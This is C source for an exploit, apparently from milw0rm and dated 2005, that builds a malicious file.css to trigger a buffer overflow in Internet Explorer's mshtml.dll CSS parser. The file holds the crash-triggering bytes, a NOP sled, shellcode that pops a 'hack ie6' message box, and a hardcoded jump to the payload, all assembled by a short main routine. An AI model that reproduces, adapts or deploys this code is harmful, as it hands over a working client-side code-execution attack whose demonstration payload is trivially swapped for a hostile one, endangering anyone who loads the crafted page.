/* 
Taken from http://www.securiteam.com/exploits/5NP042KF5A.html 

The exploit will create a .CSS file that should be included 
in an HTML file. When a user loads the HTML file, Internet 
Explorer will try to parse the CSS and will trigger the 
buffer overflow. 
*/

//Exploit Code:
#include <stdio.h>
#include <string.h>
#include <tchar.h>

char bug[]=
"\x40\x63\x73\x73\x20\x6D\x6D\x7B\x49\x7B\x63\x6F\x6E\x74\x65\x6E\x74\x3A\x20\x22\x22\x3B\x2F"
"\x2A\x22\x20\x22\x2A\x2F\x7D\x7D\x40\x6D\x3B\x40\x65\x6E\x64\x3B\x20\x2F\x2A\x22\x7D\x7D\x20\x20\x20";

//////////////////////////////////////////////////////
/*
shellcode :MessageBox (0,"hack ie6",0,MB_OK);
-
XOR EBX,EBX
PUSH EBX ; 0
PUSH EBX ; 0
ADD AL,0F
PUSH EAX ; Msg " Hack ie6 "
PUSH EBX ;0
JMP 746D8E72 ;USER32.MessageBoxA
*/

char shellcode[]= "\x33\xDB\x53\x53\x04\x0F\x50\x53\xE9\xCB\x8D\x6D\x74"
"\x90\x90\x48\x61\x63\x6B\x20\x69\x65\x36\x20\x63\x73\x73";


////////////////////////////////////////////////////////
// return address :: esp+1AC :: start shellcode
//MOV EAX,ESP
//ADD AX,1AC
//CALL EAX

char ret[]= "\x8B\xC4\x66\x05\xAC\x01\xFF\xD0";

int main(int argc, char* argv[])
{

    char buf[8192];
    FILE *cssfile;
    int i;

    printf("\n\n Internet Explorer(mshtml.dll) , Cascading Style Sheets Exploit \n");
    printf(" ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n");
    printf(" Coded by : Arabteam2000 \n");
    printf(" Web: www.arabteam2000.com \n");
    printf(" ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n");

        // NOP`s
        for(i=0;i<8192;i++)
        buf[i]=0x90;


                // bug
        memcpy((void*)&buf[0],
                (void*)&bug,48);

        // shellcode
        memcpy((void*)&buf[100],
                (void*)&shellcode,27);

        // ret address
        memcpy((void*)&buf[8182],
                (void*)&ret,8);


        cssfile=fopen("file.css","w+b");
        if(cssfile==NULL){
                printf("-Error: fopen \n");
        return 1;
        }

                fwrite(buf,8192,1,cssfile);
        printf("-Created file: file.css\n ..OK\n\n");

        fclose (cssfile);
        return 0;
}

// milw0rm.com [2005-03-09]